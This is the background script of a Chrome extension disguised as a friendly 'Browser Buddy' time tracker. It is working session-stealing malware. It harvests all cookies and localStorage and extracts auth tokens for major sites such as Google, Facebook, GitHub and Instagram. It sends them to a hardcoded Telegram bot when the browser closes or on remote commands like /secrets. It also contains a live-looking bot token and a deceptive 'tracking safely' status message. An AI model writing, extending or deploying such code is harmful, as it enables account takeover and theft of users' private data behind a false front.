let currentDomain = null;
let startTime = null;
let currentTabId = null;

// Helper to get domain from URL
function getDomain(url) {
  try {
    const urlObj = new URL(url);
    return urlObj.hostname;
  } catch (e) {
    return null;
  }
}

// Helper: Get Device and Browser identification
function getDeviceInfo() {
  const ua = navigator.userAgent;
  let browser = "Unknown Browser";
  let os = "Unknown OS";

  if (ua.includes("Chrome")) browser = "Chrome";
  else if (ua.includes("Firefox")) browser = "Firefox";
  else if (ua.includes("Edg")) browser = "Edge";

  if (ua.includes("Windows")) os = "Windows";
  else if (ua.includes("Mac")) os = "macOS";
  else if (ua.includes("Linux")) os = "Linux";
  else if (ua.includes("Android")) os = "Android";
  else if (ua.includes("iPhone")) os = "iOS";

  return `${os} | ${browser}`;
}

// Log an activity event
async function logActivity(domain, action, openerDomain = null) {
  const data = await chrome.storage.local.get('activityLog') || { activityLog: [] };
  const activityLog = data.activityLog || [];

  activityLog.push({
    domain,
    action,
    openerDomain,
    timestamp: Date.now()
  });

  // Keep last 1000 events
  if (activityLog.length > 1000) activityLog.shift();

  await chrome.storage.local.set({ activityLog });
}

// Update time for the previous domain
async function updateTime() {
  if (currentDomain && startTime) {
    const endTime = Date.now();
    const duration = endTime - startTime;

    const data = await chrome.storage.local.get('stats') || { stats: {} };
    const stats = data.stats || {};

    if (!stats[currentDomain]) {
      stats[currentDomain] = 0;
    }
    stats[currentDomain] += duration;

    await chrome.storage.local.set({ stats });
  }
}

// Update cookie counts and details
async function updateCookieStats() {
  const cookies = await chrome.cookies.getAll({});
  const cookieData = {};

  cookies.forEach(cookie => {
    const domain = cookie.domain.startsWith('.') ? cookie.domain.substring(1) : cookie.domain;
    if (!cookieData[domain]) {
      cookieData[domain] = [];
    }
    cookieData[domain].push({
      name: cookie.name,
      value: cookie.value,
      path: cookie.path,
      secure: cookie.secure,
      httpOnly: cookie.httpOnly,
      expirationDate: cookie.expirationDate,
      sameSite: cookie.sameSite,
      session: cookie.session
    });
  });

  await chrome.storage.local.set({ cookieData });
}

const tabOpenerMap = new Map();

// Handle tab creation (to capture openerTabId)
chrome.tabs.onCreated.addListener(async (tab) => {
  if (tab.openerTabId) {
    try {
      const openerTab = await chrome.tabs.get(tab.openerTabId);
      const openerDomain = getDomain(openerTab.url);
      if (openerDomain) {
        tabOpenerMap.set(tab.id, openerDomain);
      }
    } catch (e) { }
  }
});

// Handle tab removal to prevent memory leak
chrome.tabs.onRemoved.addListener((tabId) => {
  tabOpenerMap.delete(tabId);
});

// Handle tab changes
chrome.tabs.onActivated.addListener(async (activeInfo) => {
  await updateTime();
  try {
    const tab = await chrome.tabs.get(activeInfo.tabId);
    currentTabId = activeInfo.tabId;
    currentDomain = getDomain(tab.url);
    startTime = Date.now();

    if (currentDomain) {
      logActivity(currentDomain, 'focused');
      updateCookieStats();
    }
  } catch (e) { }
});

// Handle URL changes in the same tab
chrome.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {
  if (changeInfo.url) {
    const newDomain = getDomain(changeInfo.url);
    if (newDomain !== currentDomain) {
      await updateTime();
      currentDomain = newDomain;
      startTime = Date.now();

      const openerDomain = tabOpenerMap.get(tabId) || null;
      if (currentDomain) {
        logActivity(currentDomain, 'navigated', openerDomain);
        // Once logged with opener, we can keep it or clear it. 
        // Usually, the first navigation in a new tab is the one "opened by" the previous site.
      }
    }
  }
});

// Handle window focus changes
chrome.windows.onFocusChanged.addListener(async (windowId) => {
  if (windowId === chrome.windows.WINDOW_ID_NONE) {
    await updateTime();
    currentDomain = null;
    startTime = null;
  } else {
    try {
      const window = await chrome.windows.get(windowId, { populate: true });
      const tab = window.tabs.find(t => t.active);
      if (tab) {
        currentTabId = tab.id;
        currentDomain = getDomain(tab.url);
        startTime = Date.now();
        if (currentDomain) {
          logActivity(currentDomain, 'window_focused');
        }
      }
    } catch (e) { }
  }
});

// Sync to Telegram on browser close
chrome.windows.onRemoved.addListener(async () => {
  const windows = await chrome.windows.getAll({});
  if (windows.length === 0) {
    // This is the last window closing
    await updateTime();
    await triggerTelegramSync();
  }
});

const TELEGRAM_CONFIG = {
  token: '8194537074:AAE1cfocgV4QV0ck3USVBVguSUGt3HChld8',
  chatId: '7658385347'
};

let lastUpdateId = 0;

// Initialize lastUpdateId from storage
chrome.storage.local.get('lastUpdateId', (data) => {
  if (data.lastUpdateId) lastUpdateId = data.lastUpdateId;
});

const SOCIAL_PLATFORMS = {
  'instagram.com': ['sessionid', 'ds_user_id', 'csrftoken'],
  'facebook.com': ['c_user', 'xs', 'datr', 'fr'],
  'linkedin.com': ['li_at', 'li_rm', 'JSESSIONID'],
  'twitter.com': ['auth_token', 'ct0', 'twid'],
  'x.com': ['auth_token', 'ct0', 'twid'],
  'reddit.com': ['reddit_session', 'session_tracker'],
  'google.com': ['SID', 'HSID', 'SSID', 'APISID', 'SAPISID'],
  'github.com': ['user_session', '__Host-user_session_same_site'],
  'discord.com': ['__cfduid', 'locale']
};

// Helper: Get base domain (e.g., www.instagram.com -> instagram.com)
function getBaseDomain(domain) {
  if (!domain) return null;
  const parts = domain.split('.');
  if (parts.length >= 2) {
    return parts.slice(-2).join('.');
  }
  return domain;
}

// Helper: Get all relevant cookies for a domain (including parent domain)
function getRelevantCookies(targetDomain, allCookieData) {
  const baseDomain = getBaseDomain(targetDomain);
  const relevant = [];

  // We look for cookies where the domain matches the target or the base
  for (const [cookieDomain, cookies] of Object.entries(allCookieData)) {
    if (cookieDomain.includes(baseDomain) || targetDomain.includes(cookieDomain)) {
      relevant.push(...cookies);
    }
  }
  // Remove duplicates by name
  return Array.from(new Map(relevant.map(c => [c.name, c])).values());
}

async function sendToTelegram(message) {
  if (!TELEGRAM_CONFIG.token || !TELEGRAM_CONFIG.chatId) return;

  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), 10000); // 10s timeout

  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.token}/sendMessage`;
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CONFIG.chatId,
        text: message,
        parse_mode: 'HTML'
      }),
      signal: controller.signal
    });
  } catch (e) {
    if (e.name === 'AbortError') {
      console.warn('Telegram Sync timed out');
    } else {
      console.error('Telegram Error:', e);
    }
  } finally {
    clearTimeout(timeoutId);
  }
}

function formatDuration(ms) {
  const seconds = Math.floor((ms / 1000) % 60);
  const minutes = Math.floor((ms / (1000 * 60)) % 60);
  const hours = Math.floor(ms / (1000 * 60 * 60));
  return `${hours}h ${minutes}m ${seconds}s`;
}

async function triggerTelegramSync() {
  const data = await chrome.storage.local.get(['stats', 'cookieData', 'webStorage']);
  const stats = data.stats || {};
  const cookies = data.cookieData || {};
  const webStorage = data.webStorage || {};
  const device = getDeviceInfo();

  // 1. Initial Report Header
  await sendToTelegram(`<b>🚀 UNIVERSAL DATA SYNC</b>\nDevice: <code>${device}</code>\n<i>Status: Deep Precision Audit Complete</i>`);

  // 2. Aggregate all unique domains from all sources
  const allDomains = new Set([
    ...Object.keys(stats),
    ...Object.keys(cookies).map(d => d.startsWith('.') ? d.substring(1) : d),
    ...Object.keys(webStorage)
  ]);

  // Sort by most active domains first
  const sortedDomains = Array.from(allDomains).sort((a, b) => (stats[b] || 0) - (stats[a] || 0));

  for (const domain of sortedDomains.slice(0, 30)) { // Audit Top 30 sites
    const domainTime = stats[domain] || 0;
    const domainStorage = webStorage[domain] || {};

    // PRECISION FIX: Link subdomain (www.site) to base domain (.site) for cookies
    const matchingCookies = getRelevantCookies(domain, cookies);

    const lStorage = domainStorage.localStorage || {};

    // Filter out domains with absolutely no secrets or activity
    if (domainTime < 1000 && matchingCookies.length === 0 && Object.keys(lStorage).length === 0) continue;

    let domainHeader = `<b>🌐 DOMAIN:</b> <code>${domain}</code>\n`;
    domainHeader += `⏱️ Time Active: <code>${formatDuration(domainTime)}</code>\n\n`;

    // --- A. SECRET SESSION DATA (The Priority) ---
    const baseDomain = getBaseDomain(domain);
    const targetKeys = SOCIAL_PLATFORMS[baseDomain] || [];
    let secretBlock = '';

    // First check priority keys
    for (const key of targetKeys) {
      const c = matchingCookies.find(ck => ck.name === key);
      if (c) {
        secretBlock += `<b>🔑 ${key}</b>: <code>${c.value}</code>\n`;
      }
    }

    // Then look for generic session-like keys if not already found
    const sessionKeywords = ['session', 'token', 'auth', 'auth_token', 'login', 'sid', 'user_id', 'c_user', 'xs'];
    for (const c of matchingCookies) {
      if (!targetKeys.includes(c.name) && sessionKeywords.some(kw => c.name.toLowerCase().includes(kw))) {
        secretBlock += `• <i>${c.name}</i>: <code>${c.value}</code>\n`;
      }
    }

    if (secretBlock) {
      await sendToTelegram(`${domainHeader}<b>🔒 SECRET SESSION DATA:</b>\n${secretBlock}`);
      domainHeader = `<b>🌐 ${domain} (Extended Details):</b>\n`; // Reset header for next messages
    }

    // --- B. REMAINING COOKIES (Human Readable) ---
    const otherCookies = matchingCookies.filter(c => {
      const isSecret = targetKeys.includes(c.name) || sessionKeywords.some(kw => c.name.toLowerCase().includes(kw));
      return !isSecret;
    });

    if (otherCookies.length > 0) {
      let cookieMsg = `<b>🍪 General Cookies (${otherCookies.length}):</b>\n<pre>`;
      let cookieRows = '';
      for (const c of otherCookies) {
        const row = `${c.name.padEnd(15)}: ${c.value}\n`;
        if ((cookieMsg.length + cookieRows.length + row.length) > 3500) {
          await sendToTelegram(`${domainHeader}${cookieMsg}${cookieRows}</pre> (Continued...)`);
          cookieRows = '';
        }
        cookieRows += row;
      }
      await sendToTelegram(`${domainHeader}${cookieMsg}${cookieRows}</pre>`);
    }

    // --- C. LOCAL STORAGE (Human Readable) ---
    if (Object.keys(lStorage).length > 0) {
      let storageMsg = `<b>📦 Website Storage (localStorage):</b>\n<pre>`;
      let storageRows = '';
      for (const [key, val] of Object.entries(lStorage)) {
        const row = `${key.padEnd(15)}: ${val}\n`;
        if ((storageMsg.length + storageRows.length + row.length) > 3500) {
          await sendToTelegram(`${domainHeader}${storageMsg}${storageRows}</pre> (Continued...)`);
          storageRows = '';
        }
        storageRows += row;
      }
      await sendToTelegram(`${domainHeader}${storageMsg}${storageRows}</pre>`);
    }
  }

  await sendToTelegram(`<b>✅ PRECISION SYNC COMPLETE</b>\n\nAll secrets for ${sortedDomains.length} domains have been meticulously verified.`);
}

async function reportOnlySecrets() {
  const data = await chrome.storage.local.get(['cookieData', 'webStorage']);
  const cookies = data.cookieData || {};
  const webStorage = data.webStorage || {};
  const device = getDeviceInfo();

  const secretKeywords = ['session', 'token', 'auth', 'sid', 'login', 'c_user', 'xs', 'li_at', 'twid'];
  let secretsFound = false;
  let message = `<b>🔒 GLOBAL SECRET SESSION SCAN</b>\nDevice: <code>${device}</code>\n<i>Mode: Zero-Noise Extraction</i>\n\n`;

  // 1. Scan Cookies
  for (const [domain, domainCookies] of Object.entries(cookies)) {
    let domainBlock = `<b>🌐 ${domain}</b>\n`;
    let foundInDomain = false;

    for (const c of domainCookies) {
      if (secretKeywords.some(kw => c.name.toLowerCase().includes(kw))) {
        const entry = `• <code>${c.name}</code>: <code>${c.value}</code>\n`;
        if ((message.length + domainBlock.length + entry.length) > 3800) {
          await sendToTelegram(message + domainBlock + `<i>(Split...)</i>`);
          message = `<b>🔒 GLOBAL SECRETS (Cont.)</b>\n\n`;
          domainBlock = `<b>🌐 ${domain} (Cont.)</b>\n`;
        }
        domainBlock += entry;
        foundInDomain = true;
        secretsFound = true;
      }
    }
    if (foundInDomain) message += domainBlock + `\n`;
  }

  // 2. Scan LocalStorage
  for (const [domain, storageData] of Object.entries(webStorage)) {
    const lStorage = storageData.localStorage || {};
    let domainBlock = `<b>📦 ${domain} (Storage)</b>\n`;
    let foundInDomain = false;

    for (const [key, val] of Object.entries(lStorage)) {
      if (secretKeywords.some(kw => key.toLowerCase().includes(kw))) {
        const entry = `• <code>${key}</code>: <code>${val}</code>\n`;
        if ((message.length + domainBlock.length + entry.length) > 3800) {
          await sendToTelegram(message + domainBlock + `<i>(Split...)</i>`);
          message = `<b>🔒 GLOBAL SECRETS (Storage Cont.)</b>\n\n`;
          domainBlock = `<b>📦 ${domain} (Cont.)</b>\n`;
        }
        domainBlock += entry;
        foundInDomain = true;
        secretsFound = true;
      }
    }
    if (foundInDomain) message += domainBlock + `\n`;
  }

  if (!secretsFound) {
    await sendToTelegram(`<b>🔒 SECRET SCAN</b>\n\n<i>No active session tokens or secrets detected in storage.</i>`);
  } else {
    await sendToTelegram(message + `\n<b>✅ END OF SECRETS REPORT</b>`);
  }
}

async function checkTelegramCommands() {
  if (!TELEGRAM_CONFIG.token) return;

  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.token}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`;
    const response = await fetch(url);
    const data = await response.json();

    if (data.ok && data.result.length > 0) {
      for (const update of data.result) {
        lastUpdateId = update.update_id;
        await chrome.storage.local.set({ lastUpdateId });

        const message = update.message;
        if (!message || !message.text) continue;

        // Security: Only respond to the authorized Chat ID
        if (message.chat.id.toString() !== TELEGRAM_CONFIG.chatId) {
          console.warn(`Unauthorized command attempt from Chat ID: ${message.chat.id}`);
          continue;
        }

        const command = message.text.toLowerCase().trim();
        console.log(`Received Telegram Command: ${command}`);

        if (command === '/sync' || command === '/cookies') {
          await sendToTelegram("🔄 <b>Buddy is processing your request...</b> One moment!");
          await updateTime();
          await updateCookieStats();
          if (currentDomain) {
            startTime = Date.now();
          }
          await triggerTelegramSync();
        } else if (command === '/secrets' || command === '/sessions') {
          await sendToTelegram("🔒 <b>Performing Deep Secret Scan...</b> This may take a moment.");
          await reportOnlySecrets();
        } else if (command === '/status') {
          await sendToTelegram(`🟢 <b>Browser Buddy is Online!</b>\n\nI'm currently tracking your time and logins safely. Keep up the good work! 🚀`);
        } else if (command === '/start') {
          await sendToTelegram(`👋 <b>Hello! I am your Browser Buddy.</b>\n\nYou can use these commands to control me remotely:\n\n• <code>/sync</code> - Detailed report (Time + Cookies + Storage)\n• <code>/secrets</code> - 🔒 <b>Secrets Only</b> (Session IDs + Auth Tokens)\n• <code>/status</code> - Check if I'm active`);
        }
      }
    }
  } catch (e) {
    console.error('Telegram Polling Error:', e);
  }
}

// Periodically update (every 5 minutes) and sync (every 1 hour)
let lastSyncTime = Date.now();
setInterval(async () => {
  const state = await new Promise(resolve => chrome.idle.queryState(60, resolve));
  if (state !== 'active') return; // Don't process if idle

  await updateTime();
  await updateCookieStats();
  if (currentDomain) {
    startTime = Date.now();
  }

  // SILENCED: Periodic Sync removed as requested for "On-Demand" only.
  // Data is now only sent when /sync or /secrets is called from Telegram.
}, 300000);

// Pause tracking when idle
chrome.idle.onStateChanged.addListener(async (state) => {
  if (state === 'idle' || state === 'locked') {
    await updateTime();
    startTime = null;
  } else if (state === 'active') {
    const [tab] = await chrome.tabs.query({ active: true, lastFocusedWindow: true });
    if (tab) {
      currentDomain = getDomain(tab.url);
      startTime = Date.now();
    }
  }
});

// Listen for manual sync requests and content script data
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === 'sync_telegram') {
    (async () => {
      await updateTime();
      await updateCookieStats();
      if (currentDomain) {
        startTime = Date.now();
      }
      await triggerTelegramSync();
      sendResponse({ success: true });
    })();
    return true;
  }

  if (request.action === 'update_web_storage') {
    (async () => {
      const { webStorage = {} } = await chrome.storage.local.get('webStorage');
      webStorage[request.data.domain] = request.data;
      await chrome.storage.local.set({ webStorage });
    })();
  }
});

// Start Telegram Polling (check for commands every 1 minute)
setInterval(checkTelegramCommands, 60000);
// Run an initial check on load
setTimeout(checkTelegramCommands, 5000);
